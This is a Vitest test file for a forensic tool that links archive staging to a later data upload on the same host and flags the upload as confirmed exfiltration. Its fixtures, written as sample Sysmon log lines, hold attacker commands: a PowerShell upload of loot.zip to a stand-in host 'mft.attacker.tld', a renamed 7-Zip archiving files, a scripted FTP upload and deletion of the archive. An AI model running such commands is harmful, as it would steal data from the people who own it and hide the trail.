import { describe, it, expect } from "vitest";
import { linkArchiveToExfil } from "../../src/analysis/exfilCorrelate.js";
import { markProcessLifetimeSignals } from "../../src/analysis/processLifetime.js";
import { reconTechniques } from "../../src/analysis/reconTechniques.js";
import { tradecraftSignal } from "../../src/analysis/tradecraftRules.js";
import type { ForensicEvent } from "../../src/analysis/stateTypes.js";

const stage = (id: string, ts: string, asset = "FS-01"): ForensicEvent => ({
  id,
  timestamp: ts,
  asset,
  description:
    "Sysmon Process create (EID 1) - powershell.exe -c Compress-Archive -Path D:\\ClientData\\Tax2023",
  severity: "Medium",
  mitreTechniques: ["T1059", "T1560.001"],
  relatedFindingIds: [],
  sourceScreenshots: [],
  sources: ["Sysmon"],
});
const upload = (
  id: string,
  ts: string,
  asset = "FS-01",
  severity: ForensicEvent["severity"] = "Medium",
): ForensicEvent => ({
  id,
  timestamp: ts,
  asset,
  description:
    "Sysmon Process create (EID 1) - powershell.exe -c Invoke-RestMethod -Uri https://mft.attacker.tld/u -Method Put -InFile loot.zip",
  severity,
  mitreTechniques: ["T1059", "T1041"],
  relatedFindingIds: [],
  sourceScreenshots: [],
  sources: ["Sysmon"],
});

describe("linkArchiveToExfil", () => {
  it("raises a same-host upload following archive staging to High and tags it", () => {
    const out = linkArchiveToExfil([
      stage("s1", "2024-03-12T16:15:02Z"),
      upload("u1", "2024-03-12T17:00:21Z"),
    ]);
    const u = out.find((e) => e.id === "u1")!;
    expect(u.severity).toBe("High");
    expect(u.description).toContain("confirmed exfiltration");
    expect(u.description).toContain("FS-01");
    // staging event itself is untouched
    expect(out.find((e) => e.id === "s1")!.severity).toBe("Medium");
  });

  it("does NOT raise an upload on a DIFFERENT host from the staging", () => {
    const out = linkArchiveToExfil([
      stage("s1", "2024-03-12T16:15:02Z", "FS-01"),
      upload("u1", "2024-03-12T17:00:21Z", "WS-05"),
    ]);
    expect(out.find((e) => e.id === "u1")!.severity).toBe("Medium");
  });

  it("does NOT raise an upload BEFORE the staging (wrong order)", () => {
    const out = linkArchiveToExfil([
      upload("u1", "2024-03-12T10:00:00Z"),
      stage("s1", "2024-03-12T16:15:02Z"),
    ]);
    expect(out.find((e) => e.id === "u1")!.severity).toBe("Medium");
  });

  it("does NOT label a T1041 neighbour that carries no outbound transfer (over-tag guard)", () => {
    // Same host, in window, tagged T1041 — but it is a port scan, not a send. It must not be
    // decorated with "confirmed exfiltration".
    const portScan: ForensicEvent = {
      id: "p1",
      timestamp: "2024-03-12T17:00:21Z",
      asset: "FS-01",
      description: "Sysmon Process create (EID 1) - nmap.exe -sS 10.0.0.0/24",
      severity: "Medium",
      mitreTechniques: ["T1046", "T1041"],
      relatedFindingIds: [],
      sourceScreenshots: [],
      sources: ["Sysmon"],
    };
    const out = linkArchiveToExfil([stage("s1", "2024-03-12T16:15:02Z"), portScan]);
    const p = out.find((e) => e.id === "p1")!;
    expect(p.severity).toBe("Medium");
    expect(p.description).not.toContain("confirmed exfiltration");
  });

  it("does NOT raise an upload far outside the default window", () => {
    const out = linkArchiveToExfil([
      stage("s1", "2024-03-12T16:15:02Z"),
      upload("u1", "2024-03-20T16:15:02Z"), // 8 days later
    ]);
    expect(out.find((e) => e.id === "u1")!.severity).toBe("Medium");
  });

  it("honors a custom windowMinutes", () => {
    const out = linkArchiveToExfil(
      [
        stage("s1", "2024-03-12T16:00:00Z"),
        upload("u1", "2024-03-12T16:30:00Z"), // 30 min later
      ],
      { windowMinutes: 15 },
    );
    expect(out.find((e) => e.id === "u1")!.severity).toBe("Medium"); // outside a 15-min window
  });

  it("never demotes an already-Critical upload, and is idempotent on re-run", () => {
    const once = linkArchiveToExfil([
      stage("s1", "2024-03-12T16:15:02Z"),
      upload("u1", "2024-03-12T17:00:21Z", "FS-01", "Critical"),
    ]);
    expect(once.find((e) => e.id === "u1")!.severity).toBe("Critical");
    const twice = linkArchiveToExfil(once);
    const u = twice.find((e) => e.id === "u1")!;
    expect(u.severity).toBe("Critical");
    expect((u.description.match(/confirmed exfiltration/g) ?? []).length).toBe(1); // marker not duplicated
  });

  it("bounds a long description WITHOUT pushing the marker off the end (#939)", () => {
    const base = upload("u1", "2024-03-12T17:00:21Z");
    const long = { ...base, description: `${base.description} ${"x".repeat(5000)}` };
    const out = linkArchiveToExfil([stage("s1", "2024-03-12T16:15:02Z"), long]);
    const u = out.find((e) => e.id === "u1")!;
    expect(u.severity).toBe("High");
    // A raised event must state its reason: the base text is clipped, the marker never is.
    expect(u.description.length).toBeLessThan(1000);
    expect(u.description).toContain("[confirmed exfiltration:");
    expect(u.description.endsWith("]")).toBe(true);
  });

  it("keeps the marker when a LATER pass clips the same long event (#939 review)", () => {
    const base = upload("u1", "2024-03-12T17:00:21Z");
    const long = {
      ...base,
      description: `${base.description} ${"x".repeat(5000)}`,
      processName: "lsass.exe",
      parentName: "winword.exe",
    };
    const out = markProcessLifetimeSignals(linkArchiveToExfil([stage("s1", "2024-03-12T16:15:02Z"), long]));
    const u = out.find((e) => e.id === "u1")!;
    expect(u.description).toContain("[confirmed exfiltration:");
    expect(u.description).toContain("[unexpected parent:");
    expect(u.description.length).toBeLessThan(1200);
  });

  it("leaves events with no staging or no upload tag untouched", () => {
    const plain = (id: string): ForensicEvent => ({
      id,
      timestamp: "2024-03-12T12:00:00Z",
      asset: "FS-01",
      description: "benign",
      severity: "Low",
      mitreTechniques: [],
      relatedFindingIds: [],
      sourceScreenshots: [],
    });
    const out = linkArchiveToExfil([plain("p1"), plain("p2")]);
    expect(out).toEqual([plain("p1"), plain("p2")]);
  });
});

// #2090 — a renamed 7-Zip staging an archive, then a scripted `ftp -s:` upload, then a delete. Neither
// row used to carry its tag (the archive rule keyed on the `7z` binary name; no rule tagged scripted
// FTP), so the deterministic pairing never fired and the whole chain stayed Medium.
describe("linkArchiveToExfil — renamed 7-Zip + scripted FTP chain (#2090)", () => {
  const graded = (id: string, ts: string, image: string, cmd: string): ForensicEvent => {
    const sig = tradecraftSignal(image, cmd);
    return {
      id,
      timestamp: ts,
      asset: "WS-07",
      description: `Sysmon Process create (EID 1) - ${cmd}`,
      commandLine: cmd,
      severity: "Medium",
      mitreTechniques: [...new Set([...reconTechniques(image, cmd), ...(sig?.mitre ?? [])])],
      relatedFindingIds: [],
      sourceScreenshots: [],
      sources: ["Sysmon"],
    };
  };

  it("raises the ftp upload to High with the confirmed-exfiltration marker", () => {
    const out = linkArchiveToExfil([
      graded(
        "a1",
        "2024-05-02T10:00:00Z",
        "C:\\Windows\\System32\\svch.exe",
        "C:\\Windows\\System32\\svch.exe a -t7z C:\\$Recycle.Bin\\old.7z C:\\$Recycle.Bin\\data.docx",
      ),
      graded("f1", "2024-05-02T10:02:00Z", "C:\\Windows\\System32\\ftp.exe", "ftp.exe -v -s:ftp.txt"),
      graded(
        "d1",
        "2024-05-02T10:03:00Z",
        "C:\\Windows\\System32\\cmd.exe",
        "cmd /c del C:\\$Recycle.Bin\\old.7z",
      ),
    ]);
    const f = out.find((e) => e.id === "f1")!;
    expect(f.severity).toBe("High");
    expect(f.description).toContain("[confirmed exfiltration:");
    expect(out.find((e) => e.id === "d1")!.severity).toBe("Medium");
  });
});
